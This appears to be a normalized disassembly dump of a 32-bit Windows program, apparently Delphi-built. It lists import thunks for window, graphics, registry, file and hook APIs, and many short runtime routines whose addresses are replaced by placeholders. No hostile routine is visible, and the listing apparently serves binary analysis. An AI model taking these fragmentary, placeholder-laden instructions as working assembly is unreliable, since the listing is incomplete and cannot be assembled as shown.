sub_40122c
jmp [ __import_lookup_table_1(user32:CharNextA) ]
sub_401234
jmp [ __import_lookup_table_0(kernel32:CreateThread) ]
ExitThread
jmp [ ExitThread@IAT ]
ExitProcess
jmp [ ExitProcess@IAT ]
sub_40124c
jmp [ __import_lookup_table_1(user32:MessageBoxA) ]
sub_401254
jmp [ __import_lookup_table_0(kernel32:FindClose) ]
sub_40125c
jmp [ __import_lookup_table_0(kernel32:FindFirstFileA) ]
sub_401264
jmp [ __import_lookup_table_0(kernel32:FreeLibrary) ]
GetCommandLineA
jmp [ GetCommandLineA@IAT ]
sub_401274
jmp [ __import_lookup_table_0(kernel32:GetLocaleInfoA) ]
sub_40127c
jmp [ __import_lookup_table_0(kernel32:GetModuleFileNameA) ]
sub_401284
jmp [ __import_lookup_table_0(kernel32:GetModuleHandleA) ]
sub_40128c
jmp [ __import_lookup_table_0(kernel32:GetProcAddress) ]
GetStartupInfoA
jmp [ GetStartupInfoA@IAT ]
sub_4012ac
jmp [ __import_lookup_table_1(user32:LoadStringA) ]
MultiByteToWideChar
jmp [ MultiByteToWideChar@IAT ]
sub_4012cc
jmp [ __import_lookup_table_2(advapi32:RegCloseKey) ]
WideCharToMultiByte
jmp [ __import_lookup_table_0(kernel32:WideCharToMultiByte) ]
sub_4012ec
jmp [ __import_lookup_table_0(kernel32:VirtualQuery) ]
SysAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysAllocStringLen) ]
SysReAllocStringLen
jmp [ __import_lookup_table_3(oleaut32:SysReAllocStringLen) ]
SysFreeString
jmp [ __import_lookup_table_3(oleaut32:SysFreeString) ]
sub_40130c
jmp [ __import_lookup_table_0(kernel32:InterlockedIncrement) ]
sub_401314
jmp [ __import_lookup_table_0(kernel32:InterlockedDecrement) ]
sub_40131c
jmp [ __import_lookup_table_0(kernel32:GetCurrentThreadId) ]
sub_40132c
push ebx
add esp 0xffffffbc
mov ebx 0xa
push esp
call GetStartupInfoA
test [ esp + 0x2c ] 0x1
je r-xdata
mov eax ebx
add esp 0x44
pop ebx
retn
movzx ebx [ esp + 0x30 ]
sub_401350
jmp [ __import_lookup_table_0(kernel32:LocalAlloc) ]
VirtualFree
jmp [ __import_lookup_table_0(kernel32:VirtualFree) ]
sub_401370
jmp [ __import_lookup_table_0(kernel32:InitializeCriticalSection) ]
sub_401378
jmp [ __import_lookup_table_0(kernel32:EnterCriticalSection) ]
sub_401380
jmp [ __import_lookup_table_0(kernel32:LeaveCriticalSection) ]
sub_401388
jmp [ __import_lookup_table_0(kernel32:DeleteCriticalSection) ]
sub_401ad2
jmp sub_4038d0
sub_401ad9
mov al [ rw-data ]
pop ebp
retn
sub_401bb6
jmp sub_4038d0
sub_401c84
inc [ rw-data ]
mov edx eax
sub edx 0x4
mov edx [ edx ]
and edx 0x7ffffffc
sub edx 0x4
add [ rw-data ] edx
call sub_402298
retn
sub_402284
jmp sub_4038d0
sub_40242a
jmp sub_4038d0
sub_4026c9
jmp sub_4038d0
sub_40278c
call sub_405eec
cmp [ eax ] 0x0
je r-xdata
xor eax eax
retn
call sub_405eec
mov eax [ eax ]
mov eax [ eax + 0x4 ]
retn
sub_4027e0
mov [ rw-data ] edx
call sub_403eb4
sub_402844
push eax
push edx
push ecx
call sub_405eec
cmp [ eax + 0x4 ] 0x0
pop ecx
pop edx
pop eax
jne r-xdata
xor eax eax
jmp sub_402838
retn
sub_402860
retn
sub_4028b4
retn
sub_4028b8
push ebx
call sub_405eec
mov ebx [ eax + 0x4 ]
call sub_405eec
xor edx edx
mov [ eax + 0x4 ] edx
mov eax ebx
pop ebx
retn
sub_402924
mov [ rw-data ] ax
fnclex
fldcw [ rw-data ]
retn
sub_402934
push 0x0
fnstcw [ esp ]
pop eax
retn
sub_4029ac
mov edx [ eax + 0x1c ]
call sub_402964
retn
sub_402a3f
retn
sub_402c50
mov ecx 0xff
call sub_402c5c
retn
sub_402c80
push esi
push edi
mov esi eax
mov edi edx
and ecx 0xff
[ esi ] [ edi ]
pop edi
pop esi
retn
sub_402c94
mov ch [ edx ]
inc edx
or [ eax ] ch
inc eax
dec cl
jne sub_402c94
retn
j_sub_402ca8
jmp sub_402ca8
sub_402ca5
retn
sub_403035
jmp sub_4038d0
sub_403088
fninit
fwait
fldcw [ rw-data ]
retn
sub_4030e0
mov eax [ eax - 0x24 ]
test eax eax
je r-xdata
retn
mov eax [ eax ]
sub_4030ec
push ebx
mov ebx eax
mov eax ebx
call sub_40311c
call sub_4026dc
mov edx eax
mov eax ebx
call sub_403160
pop ebx
retn
sub_403108
push ebx
mov ebx eax
mov eax ebx
call sub_4031b8
mov eax ebx
call sub_4026fc
pop ebx
retn
sub_40311c
add eax 0xffffffd8
mov eax [ eax ]
retn
sub_403144
call sub_403508
test dl dl
jle r-xdata
retn
call sub_4034f0
sub_403204
retn
sub_40328c
jmp sub_4038d0
sub_403293
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_403384
mov eax 0x8000ffff
retn
sub_40338c
retn
sub_403390
retn
sub_403394
retn
sub_4034c9
jmp sub_40361c
sub_4034ce
mov eax [ esp + 0x2c ]
mov eax [ eax + 0xc ]
test eax eax
je r-xdata
call sub_403930
retn
mov ecx [ eax ]
mov dl 0x81
push eax
call [ ecx - 0x4 ]
pop eax
call sub_4034f0
sub_4034f0
mov edx [ eax ]
call [ edx - 0x8 ]
retn
sub_403508
test dl dl
jg r-xdata
push eax
push edx
mov edx [ eax ]
call [ edx - 0x18 ]
pop edx
pop eax
retn
retn
sub_403518
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push 0x0
push 0x0
push 0x0
push 0xeedfadf
call [ rw-data ]
sub_4035e0
cmp [ rw-data ] 0x1
jbe r-xdata
retn
push edx
push esp
push 0x1
push 0x0
push 0xeedfae2
call [ rw-data ]
pop edx
sub_4035fc
push eax
push edx
cmp [ rw-data ] 0x1
jbe r-xdata
pop edx
pop eax
retn
push esp
push 0x2
push 0x0
push 0xeedfae3
call [ rw-data ]
sub_4039c9
retn
sub_403b0c
xor edx edx
lea eax [ ebp - 0xc ]
mov ecx [ fs : edx ]
mov [ fs : edx ] eax
mov [ eax ] ecx
mov [ eax + 0x4 ] r-xdata
mov [ eax + 0x8 ] ebp
mov [ rw-data ] eax
retn
sub_403b9a
jmp sub_40361c
sub_403bfa
jmp sub_40361c
sub_403c14
mov [ rw-data ] r-xdata
mov [ rw-data ] r-xdata
mov [ rw-data ] eax
xor eax eax
mov [ rw-data ] eax
mov [ rw-data ] edx
mov eax [ edx + 0x4 ]
mov [ rw-data ] eax
call sub_403b0c
mov [ rw-data ] 0x0
call sub_403bb4
retn
sub_403d4d
retn
sub_403eaf
pop ebp
pop edi
pop esi
pop ebx
retn
sub_403eb4
mov [ rw-data ] eax
call sub_403ddc
sub_403f48
push eax
call ExitThread
sub_404174
retn
sub_4041b0
retn
sub_4041be
retn
sub_4041d7
retn
sub_4041e8
retn
sub_4042cf
retn
j_sub_40441c#2
jmp sub_40441c
sub_404465
retn
sub_40446d
retn
sub_4044af
retn
sub_404608
test eax eax
je r-xdata
retn
push eax
push 0x0
call SysAllocStringLen
test eax eax
je r-xdata
mov al 0x1
jmp sub_402838
sub_404620
xchg [ eax ] edx
test edx edx
je r-xdata
retn
push edx
call SysFreeString
sub_404778
retn
sub_40478a
retn
sub_40478c
test eax eax
je r-xdata
mov eax r-xdata
retn
retn
sub_4049b4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404ab8
mov ecx 0x1
jmp sub_4049cc
sub_404ac2
retn
sub_404ac4
cmp [ rw-data ] 0x0
je r-xdata
mov al 0x10
call sub_402838
call [ rw-data ]
retn
sub_404cea
retn
sub_404cec
mov al 0x11
jmp sub_402838
sub_404d17
retn
sub_404f58
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_404bf8
pop ebp
retn 0x4
j_sub_4049cc
jmp sub_4049cc
sub_404f6d
retn
sub_404f70
call sub_405110
retn
sub_40519c
call sub_405174
retn
sub_4054e5
jmp sub_4038d0
sub_405650
call sub_405660
retn
sub_405658
call sub_405680
retn
sub_405660
push ebx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edx [ rw-data ]
mov [ eax ] edx
mov [ eax + 0x4 ] ebx
mov [ rw-data ] eax
pop ebx
retn
sub_40571b
jmp sub_40361c
sub_40573c
mov edx [ rw-data ]
mov [ eax ] edx
mov [ rw-data ] eax
retn
sub_4057b0
jmp sub_4038d0
sub_4057b7
pop ecx
pop ebp
retn
sub_405830
test eax eax
je r-xdata
retn
push eax
mov eax [ eax ]
call [ eax + 0x4 ]
sub_40583c
add eax 0x4
push eax
call sub_401314
retn
sub_405848
cmp [ eax + 0x4 ] 0x0
je r-xdata
retn
mov al 0x2
call sub_402838
sub_405858
call sub_4030ec
mov [ eax + 0x4 ] 0x1
retn
sub_405890
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
add eax 0x4
push eax
call sub_40130c
pop ebp
retn 0x4
sub_405b7f
jmp sub_4038d0
sub_405b86
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c23
jmp sub_4038d0
sub_405c2a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405c73
jmp sub_4038d0
sub_405c7a
pop esi
pop ebx
pop ecx
pop ebp
retn
sub_405d3e
jmp sub_4038d0
sub_405d45
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
sub_405d96
jmp sub_4038d0
sub_405d9d
pop ebp
retn
sub_405e74
jmp [ __import_lookup_table_4(kernel32:GetModuleHandleA) ]
LocalAlloc
jmp [ __import_lookup_table_4(kernel32:LocalAlloc) ]
TlsSetValue
jmp [ __import_lookup_table_4(kernel32:TlsSetValue) ]
sub_405e94
push eax
push 0x40
call LocalAlloc
retn
sub_405ea0
mov eax 0x10
retn
sub_405f2c
mov eax rw-data
call sub_40573c
retn
sub_405fa1
jmp sub_4038d0
sub_405fa8
pop ebp
retn
sub_405fac
sub [ rw-data ] 0x1
retn
sub_405fb4
push ebp
mov ebp esp
push ebx
mov ebx [ ebp + 0x8 ]
mov [ ebx ] eax
mov [ ebx + 0x4 ] edx
mov eax [ ebp + 0xc ]
mov [ ebx + 0xc ] eax
mov [ ebx + 0x8 ] ecx
pop ebx
pop ebp
retn 0x8
sub_405fd0
mov [ ecx ] eax
mov [ ecx + 0x4 ] edx
retn
sub_405fd8
test eax eax
je r-xdata
xor eax eax
retn
add [ eax ] edx
add [ eax + 0x8 ] edx
add [ eax + 0x4 ] ecx
add [ eax + 0xc ] ecx
mov al 0x1
retn
sub_40605d
jmp sub_4038d0
sub_406064
pop ebp
retn
sub_406068
sub [ rw-data ] 0x1
retn
RegCloseKey
jmp [ RegCloseKey@IAT ]
RegOpenKeyExA
jmp [ __import_lookup_table_5(advapi32:RegOpenKeyExA) ]
RegQueryValueExA
jmp [ __import_lookup_table_5(advapi32:RegQueryValueExA) ]
CompareStringA
jmp [ __import_lookup_table_6(kernel32:CompareStringA) ]
CreateFileA
jmp [ CreateFileA@IAT ]
CreateThread
jmp [ CreateThread@IAT ]
DeleteFileA
jmp [ DeleteFileA@IAT ]
FileTimeToDosDateTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToDosDateTime) ]
FileTimeToLocalFileTime
jmp [ __import_lookup_table_6(kernel32:FileTimeToLocalFileTime) ]
FindClose
jmp [ __import_lookup_table_6(kernel32:FindClose) ]
FindFirstFileA
jmp [ __import_lookup_table_6(kernel32:FindFirstFileA) ]
FindResourceA
jmp [ __import_lookup_table_6(kernel32:FindResourceA) ]
FormatMessageA
jmp [ FormatMessageA@IAT ]
InterlockedDecrement
jmp [ InterlockedDecrement@IAT ]
InterlockedExchange
jmp [ InterlockedExchange@IAT ]
InterlockedIncrement
jmp [ __import_lookup_table_6(kernel32:InterlockedIncrement) ]
FreeResource
jmp [ __import_lookup_table_6(kernel32:FreeResource) ]
GetACP
jmp [ GetACP@IAT ]
GetCPInfo
jmp [ GetCPInfo@IAT ]
GetCurrentProcessId
jmp [ GetCurrentProcessId@IAT ]
GetDateFormatA
jmp [ GetDateFormatA@IAT ]
GetDiskFreeSpaceA
jmp [ GetDiskFreeSpaceA@IAT ]
GetExitCodeThread
jmp [ GetExitCodeThread@IAT ]
GetFileSize
jmp [ GetFileSize@IAT ]
GetFullPathNameA
jmp [ GetFullPathNameA@IAT ]
GetLocalTime
jmp [ GetLocalTime@IAT ]
GetLocaleInfoA
jmp [ GetLocaleInfoA@IAT ]
GetModuleHandleA
jmp [ GetModuleHandleA@IAT ]
GetStringTypeExA
jmp [ __import_lookup_table_6(kernel32:GetStringTypeExA) ]
GetSystemInfo
jmp [ __import_lookup_table_6(kernel32:GetSystemInfo) ]
GetTempPathA
jmp [ GetTempPathA@IAT ]
GetVersion
jmp [ GetVersion@IAT ]
GetVersionExA
jmp [ __import_lookup_table_6(kernel32:GetVersionExA) ]
GlobalAlloc
jmp [ __import_lookup_table_6(kernel32:GlobalAlloc) ]
GlobalFindAtomA
jmp [ __import_lookup_table_6(kernel32:GlobalFindAtomA) ]
GlobalFree
jmp [ __import_lookup_table_6(kernel32:GlobalFree) ]
GlobalLock
jmp [ __import_lookup_table_6(kernel32:GlobalLock) ]
GlobalHandle
jmp [ __import_lookup_table_6(kernel32:GlobalHandle) ]
GlobalReAlloc
jmp [ GlobalReAlloc@IAT ]
GlobalUnlock
jmp [ __import_lookup_table_6(kernel32:GlobalUnlock) ]
LeaveCriticalSection
jmp [ __import_lookup_table_6(kernel32:LeaveCriticalSection) ]
LoadLibraryA
jmp [ __import_lookup_table_6(kernel32:LoadLibraryA) ]
LoadResource
jmp [ LoadResource@IAT ]
LockResource
jmp [ LockResource@IAT ]
ReadFile
jmp [ __import_lookup_table_6(kernel32:ReadFile) ]
ResetEvent
jmp [ __import_lookup_table_6(kernel32:ResetEvent) ]
ResumeThread
jmp [ __import_lookup_table_6(kernel32:ResumeThread) ]
SetEndOfFile
jmp [ __import_lookup_table_6(kernel32:SetEndOfFile) ]
SetEvent
jmp [ __import_lookup_table_6(kernel32:SetEvent) ]
SetFilePointer
jmp [ __import_lookup_table_6(kernel32:SetFilePointer) ]
SetThreadLocale
jmp [ SetThreadLocale@IAT ]
SetThreadPriority
jmp [ SetThreadPriority@IAT ]
SizeofResource
jmp [ SizeofResource@IAT ]
sub_40637c
jmp [ __import_lookup_table_6(kernel32:Sleep) ]
SuspendThread
jmp [ __import_lookup_table_6(kernel32:SuspendThread) ]
VirtualAlloc
jmp [ __import_lookup_table_6(kernel32:VirtualAlloc) ]
VirtualQuery
jmp [ __import_lookup_table_6(kernel32:VirtualQuery) ]
WaitForSingleObject
jmp [ __import_lookup_table_6(kernel32:WaitForSingleObject) ]
lstrcmpA
jmp [ lstrcmpA@IAT ]
lstrcpyA
jmp [ lstrcpyA@IAT ]
GetFileVersionInfoA
jmp [ __import_lookup_table_7(version:GetFileVersionInfoA) ]
GetFileVersionInfoSizeA
jmp [ GetFileVersionInfoSizeA@IAT ]
VerQueryValueA
jmp [ __import_lookup_table_7(version:VerQueryValueA) ]
CreateBitmap
jmp [ CreateBitmap@IAT ]
CreateBrushIndirect
jmp [ CreateBrushIndirect@IAT ]
CreateDIBSection
jmp [ CreateDIBSection@IAT ]
CreateDIBitmap
jmp [ CreateDIBitmap@IAT ]
CreateHalftonePalette
jmp [ CreateHalftonePalette@IAT ]
CreatePalette
jmp [ CreatePalette@IAT ]
CreatePenIndirect
jmp [ CreatePenIndirect@IAT ]
ExcludeClipRect
jmp [ ExcludeClipRect@IAT ]
ExtTextOutA
jmp [ ExtTextOutA@IAT ]
GetBrushOrgEx
jmp [ GetBrushOrgEx@IAT ]
GetClipBox
jmp [ GetClipBox@IAT ]
GetCurrentPositionEx
jmp [ __import_lookup_table_8(gdi32:GetCurrentPositionEx) ]
GetDCOrgEx
jmp [ GetDCOrgEx@IAT ]
GetDIBColorTable
jmp [ __import_lookup_table_8(gdi32:GetDIBColorTable) ]
GetPixel
jmp [ __import_lookup_table_8(gdi32:GetPixel) ]
GetTextExtentPoint32A
jmp [ GetTextExtentPoint32A@IAT ]
GetWindowOrgEx
jmp [ GetWindowOrgEx@IAT ]
LineTo
jmp [ LineTo@IAT ]
MaskBlt
jmp [ MaskBlt@IAT ]
MoveToEx
jmp [ MoveToEx@IAT ]
Polyline
jmp [ __import_lookup_table_8(gdi32:Polyline) ]
RectVisible
jmp [ __import_lookup_table_8(gdi32:RectVisible) ]
Rectangle
jmp [ __import_lookup_table_8(gdi32:Rectangle) ]
SetAbortProc
jmp [ SetAbortProc@IAT ]
SetBrushOrgEx
jmp [ __import_lookup_table_8(gdi32:SetBrushOrgEx) ]
SetDIBColorTable
jmp [ SetDIBColorTable@IAT ]
SetPixel
jmp [ __import_lookup_table_8(gdi32:SetPixel) ]
SetROP2
jmp [ SetROP2@IAT ]
SetViewportOrgEx
jmp [ SetViewportOrgEx@IAT ]
SetWindowOrgEx
jmp [ SetWindowOrgEx@IAT ]
UnrealizeObject
jmp [ UnrealizeObject@IAT ]
ActivateKeyboardLayout
jmp [ ActivateKeyboardLayout@IAT ]
AdjustWindowRectEx
jmp [ AdjustWindowRectEx@IAT ]
CharLowerA
jmp [ CharLowerA@IAT ]
BeginPaint
jmp [ BeginPaint@IAT ]
CallNextHookEx
jmp [ CallNextHookEx@IAT ]
CharNextA
jmp [ __import_lookup_table_9(user32:CharNextA) ]
CharToOemA
jmp [ CharToOemA@IAT ]
CharUpperBuffA
jmp [ CharUpperBuffA@IAT ]
CheckMenuItem
jmp [ __import_lookup_table_9(user32:CheckMenuItem) ]
ChildWindowFromPoint
jmp [ __import_lookup_table_9(user32:ChildWindowFromPoint) ]
ClientToScreen
jmp [ __import_lookup_table_9(user32:ClientToScreen) ]
CreateIcon
jmp [ __import_lookup_table_9(user32:CreateIcon) ]
CreateMenu
jmp [ CreateMenu@IAT ]
CreatePopupMenu
jmp [ __import_lookup_table_9(user32:CreatePopupMenu) ]
DefFrameProcA
jmp [ DefFrameProcA@IAT ]
DefWindowProcA
jmp [ DefWindowProcA@IAT ]
DestroyIcon
jmp [ DestroyIcon@IAT ]
DestroyMenu
jmp [ DestroyMenu@IAT ]
DestroyWindow
jmp [ DestroyWindow@IAT ]
DispatchMessageA
jmp [ __import_lookup_table_9(user32:DispatchMessageA) ]
DrawFrameControl
jmp [ __import_lookup_table_9(user32:DrawFrameControl) ]
DrawIcon
jmp [ __import_lookup_table_9(user32:DrawIcon) ]
DrawIconEx
jmp [ DrawIconEx@IAT ]
DrawMenuBar
jmp [ __import_lookup_table_9(user32:DrawMenuBar) ]
EnableWindow
jmp [ __import_lookup_table_9(user32:EnableWindow) ]
EndPaint
jmp [ __import_lookup_table_9(user32:EndPaint) ]
EnumThreadWindows
jmp [ EnumThreadWindows@IAT ]
EnumWindows
jmp [ __import_lookup_table_9(user32:EnumWindows) ]
EqualRect
jmp [ __import_lookup_table_9(user32:EqualRect) ]
FindWindowA
jmp [ FindWindowA@IAT ]
GetClassNameA
jmp [ GetClassNameA@IAT ]
GetClientRect
jmp [ GetClientRect@IAT ]
GetCursor
jmp [ GetCursor@IAT ]
GetDC
jmp [ GetDC@IAT ]
GetDCEx
jmp [ __import_lookup_table_9(user32:GetDCEx) ]
GetForegroundWindow
jmp [ GetForegroundWindow@IAT ]
GetIconInfo
jmp [ GetIconInfo@IAT ]
GetKeyNameTextA
jmp [ __import_lookup_table_9(user32:GetKeyNameTextA) ]
GetKeyboardLayout
jmp [ __import_lookup_table_9(user32:GetKeyboardLayout) ]
GetKeyboardLayoutList
jmp [ GetKeyboardLayoutList@IAT ]
GetKeyboardState
jmp [ GetKeyboardState@IAT ]
GetLastActivePopup
jmp [ GetLastActivePopup@IAT ]
GetMenu
jmp [ GetMenu@IAT ]
GetMenuItemID
jmp [ GetMenuItemID@IAT ]
GetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:GetMenuItemInfoA) ]
GetMenuStringA
jmp [ __import_lookup_table_9(user32:GetMenuStringA) ]
__imp_GetWindow
jmp [ __import_lookup_table_9(user32:GetWindow) ]
GetParent
jmp [ GetParent@IAT ]
GetPropA
jmp [ GetPropA@IAT ]
GetSubMenu
jmp [ __import_lookup_table_9(user32:GetSubMenu) ]
GetSysColor
jmp [ __import_lookup_table_9(user32:GetSysColor) ]
GetSysColorBrush
jmp [ __import_lookup_table_9(user32:GetSysColorBrush) ]
GetSystemMenu
jmp [ GetSystemMenu@IAT ]
GetTopWindow
jmp [ GetTopWindow@IAT ]
GetWindowDC
jmp [ GetWindowDC@IAT ]
GetWindowPlacement
jmp [ __import_lookup_table_9(user32:GetWindowPlacement) ]
GetWindowRect
jmp [ __import_lookup_table_9(user32:GetWindowRect) ]
GetWindowTextA
jmp [ __import_lookup_table_9(user32:GetWindowTextA) ]
__imp_GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
GetWindowThreadProcessId
jmp [ __import_lookup_table_9(user32:GetWindowThreadProcessId) ]
InsertMenuItemA
jmp [ InsertMenuItemA@IAT ]
IsChild
jmp [ __import_lookup_table_9(user32:IsChild) ]
IsDialogMessageA
jmp [ IsDialogMessageA@IAT ]
IsRectEmpty
jmp [ __import_lookup_table_9(user32:IsRectEmpty) ]
IsWindow
jmp [ __import_lookup_table_9(user32:IsWindow) ]
IsWindowEnabled
jmp [ IsWindowEnabled@IAT ]
IsZoomed
jmp [ __import_lookup_table_9(user32:IsZoomed) ]
KillTimer
jmp [ KillTimer@IAT ]
LoadBitmapA
jmp [ __import_lookup_table_9(user32:LoadBitmapA) ]
LoadIconA
jmp [ __import_lookup_table_9(user32:LoadIconA) ]
LoadStringA
jmp [ LoadStringA@IAT ]
MapVirtualKeyA
jmp [ MapVirtualKeyA@IAT ]
MessageBoxA
jmp [ MessageBoxA@IAT ]
MsgWaitForMultipleObjects
jmp [ MsgWaitForMultipleObjects@IAT ]
OemToCharA
jmp [ OemToCharA@IAT ]
PeekMessageA
jmp [ __import_lookup_table_9(user32:PeekMessageA) ]
PostQuitMessage
jmp [ __import_lookup_table_9(user32:PostQuitMessage) ]
PtInRect
jmp [ __import_lookup_table_9(user32:PtInRect) ]
RedrawWindow
jmp [ __import_lookup_table_9(user32:RedrawWindow) ]
RegisterClassA
jmp [ RegisterClassA@IAT ]
RegisterClipboardFormatA
jmp [ RegisterClipboardFormatA@IAT ]
ReleaseCapture
jmp [ ReleaseCapture@IAT ]
ReleaseDC
jmp [ ReleaseDC@IAT ]
RemoveMenu
jmp [ RemoveMenu@IAT ]
ScrollWindow
jmp [ ScrollWindow@IAT ]
SetActiveWindow
jmp [ SetActiveWindow@IAT ]
SetCapture
jmp [ __import_lookup_table_9(user32:SetCapture) ]
SetClassLongA
jmp [ __import_lookup_table_9(user32:SetClassLongA) ]
SetForegroundWindow
jmp [ __import_lookup_table_9(user32:SetForegroundWindow) ]
SetMenuItemInfoA
jmp [ __import_lookup_table_9(user32:SetMenuItemInfoA) ]
SetParent
jmp [ SetParent@IAT ]
SetTimer
jmp [ __import_lookup_table_9(user32:SetTimer) ]
SetWindowPlacement
jmp [ SetWindowPlacement@IAT ]
SetWindowTextA
jmp [ SetWindowTextA@IAT ]
SetWindowsHookExA
jmp [ SetWindowsHookExA@IAT ]
ShowCursor
jmp [ ShowCursor@IAT ]
ShowOwnedPopups
jmp [ ShowOwnedPopups@IAT ]
ShowScrollBar
jmp [ __import_lookup_table_9(user32:ShowScrollBar) ]
TrackPopupMenu
jmp [ __import_lookup_table_9(user32:TrackPopupMenu) ]
TranslateMDISysAccel
jmp [ TranslateMDISysAccel@IAT ]
TranslateMessage
jmp [ TranslateMessage@IAT ]
UnhookWindowsHookEx
jmp [ UnhookWindowsHookEx@IAT ]
UnregisterClassA
jmp [ UnregisterClassA@IAT ]
UpdateWindow
jmp [ UpdateWindow@IAT ]
WaitMessage
jmp [ WaitMessage@IAT ]
WinHelpA
jmp [ WinHelpA@IAT ]
WindowFromPoint
jmp [ __import_lookup_table_9(user32:WindowFromPoint) ]
sub_406aa4
and eax 0xff
and edx 0xff
shl edx 0x8
or ax dx
retn
sub_406ac4
shr eax 0x10
retn
sub_406ac8
movzx eax ax
shr eax 0x8
retn
sub_406ad0
call GetTickCount
retn
sub_406ad8
xchg edx eax
call sub_4028d8
retn
sub_406ae0
xor eax eax
retn
sub_406ae4
push edx
push eax
call GlobalAlloc
push eax
call GlobalLock
retn
sub_406af4
push ecx
push edx
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalReAlloc
push eax
call GlobalLock
retn
sub_406b10
push eax
call GlobalHandle
push eax
push eax
call GlobalUnlock
call GlobalFree
retn
sub_406b24
shl edx 0x8
and edx 0xff000000
or eax edx
retn
sub_406b5c
call sub_406ab8
retn
CreateWindowExA
jmp [ __import_lookup_table_9(user32:CreateWindowExA) ]
sub_406d39
jmp sub_4038d0
sub_406d40
pop ebp
retn
sub_406d44
sub [ rw-data ] 0x1
retn
sub_406d71
jmp sub_4038d0
sub_406d78
pop ebp
retn
sub_406d7c
sub [ rw-data ] 0x1
retn
sub_407089
jmp sub_4038d0
sub_407090
pop ebp
retn
sub_407094
sub [ rw-data ] 0x1
retn
sub_407b85
add eax 0xffffffd4
jmp sub_40d0c8
sub_407b8d
add eax 0xffffffd4
jmp sub_40cf70
sub_407b95
add eax 0xffffffd4
jmp sub_40d00c
sub_407ba7
add [ esp + 0x4 ] 0xffffffd4
jmp sub_405890
sub_407bb1
add [ esp + 0x4 ] 0xffffffd4
jmp sub_4058a4
sub_408480
call sub_40845c
retn
sub_408518
push eax
call CloseHandle
retn
sub_408588
push ebx
mov ebx eax
mov eax ebx
call sub_408520
inc eax
setne al
pop ebx
retn
sub_408598
push ebx
mov ebx eax
mov eax ebx
call sub_404410
push eax
call DeleteFileA
cmp eax 0x1
sbb eax eax
inc eax
pop ebx
retn
sub_408730
mov edx edi
mov edi eax
mov ecx 0xffffffff
xor al al
[ edi ]
lea eax [ edi - 0x1 ]
mov edi edx
retn
sub_408744
push esi
mov esi eax
xchg edx eax
call sub_4028d8
mov eax esi
pop esi
retn
sub_408904
push ebx
push esi
mov esi edx
mov ebx eax
mov eax esi
mov edx ebx
call sub_404148
pop esi
pop ebx
retn
sub_408918
push ebx
mov ebx eax
add ebx 0x4
mov eax ebx
call sub_4026dc
mov [ eax ] ebx
add eax 0x4
pop ebx
retn
sub_40892c
sub eax 0x4
mov eax [ eax ]
sub eax 0x4
retn
sub_408964
test eax eax
je r-xdata
retn
sub eax 0x4
mov edx [ eax ]
call sub_4026fc
sub_4089cc
push ebx
mov ecx [ rw-data ]
cmp [ ecx ] 0x0
je r-xdata
mov al 0x10
call sub_402838
mov ebx [ rw-data ]
mov ebx [ ebx ]
call ebx
pop ebx
retn
sub_4089f0
push ebx
mov ebx eax
mov eax ebx
call sub_403f50
pop ebx
retn
sub_408d53
push ebx
push eax
lea eax [ ebp - 0x14 ]
mov ebx [ ebp - 0x4 ]
call sub_403f50
pop eax
pop ebx
retn
sub_40900b
cmp [ ebp - 0x2a ] 0x0
je r-xdata
retn
mov al 0x2d
stosb [ edi ]
sub_409166
push esi
mov esi [ ebp - 0xc ]
test esi esi
je r-xdata
pop esi
retn
mov ecx [ esi - 0x4 ]
[ edi ] [ esi ]
sub_4094c3
lodsb [ esi ]
or al al
je r-xdata
dec esi
retn
cmp al 0x20
je sub_4094c3
sub_409580
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404410
mov edx esi
xor ecx ecx
call sub_40940c
pop esi
pop ebx
retn
sub_4095f4
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_404410
mov edx esi
mov cl 0x1
call sub_40940c
pop esi
pop ebx
retn
sub_409c6e
jmp sub_4038d0
sub_409c75
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_409d66
jmp sub_4038d0
sub_409d6d
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a511
jmp sub_4038d0
sub_40a518
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40a5a0
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
xor edx edx
call sub_40a544
pop ebp
retn 0x8
sub_40a6e5
jmp sub_4038d0
sub_40a6ec
mov eax ebx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_40ab8f
jmp sub_4038d0
sub_40ab96
mov al [ ebp - 0x9 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b0af
jmp sub_4038d0
sub_40b0b6
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b161
jmp sub_4038d0
sub_40b168
mov eax esi
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
sub_40b20b
jmp sub_4038d0
sub_40b212
pop esi
pop ecx
pop ebp
retn
sub_40b3ee
jmp sub_4038d0
sub_40b3f5
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b44c
test eax eax
je r-xdata
retn
sub eax 0x1000
sub_40b73e
jmp sub_4038d0
sub_40b80c
jmp sub_4038d0
sub_40b834
cmp [ eax + 0xc ] 0x0
je r-xdata
retn
call sub_403108
sub_40b9d0
jmp sub_4038d0
sub_40b9d7
mov eax ebx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
sub_40b9e0
mov esp ecx
mov [ esp ] edx
mov ebp [ ebp ]
jmp sub_403908
sub_40b9ed
retn
sub_40b9f0
push ebp
mov ebp esp
call sub_40b934
lea ecx [ ebp + 0x8 ]
add ecx 0x4
mov edx [ ebp + 0x8 ]
call sub_40b9e0
pop ebp
retn 0x4
